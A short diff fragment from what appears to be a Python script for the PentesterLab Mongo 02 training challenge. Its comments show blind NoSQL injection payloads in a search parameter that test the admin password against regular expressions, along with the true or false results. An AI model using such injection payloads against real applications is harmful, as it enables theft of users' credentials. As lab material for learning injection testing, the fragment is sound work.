@@ -1,3 +1,5 @@
+##Quick and dirty script in Python3 written to solve the PentesterLab Mongo 02 Challenge##
+
 # http://ptc-b5d4fa12-8ed46fb7.libcurl.so/?search=admin%27%26%26%20this.password.match(/d/)%00 = true
 # http://ptc-b5d4fa12-8ed46fb7.libcurl.so/?search=admin%27%26%26%20this.password.match(/aaa/)%00 = false
 
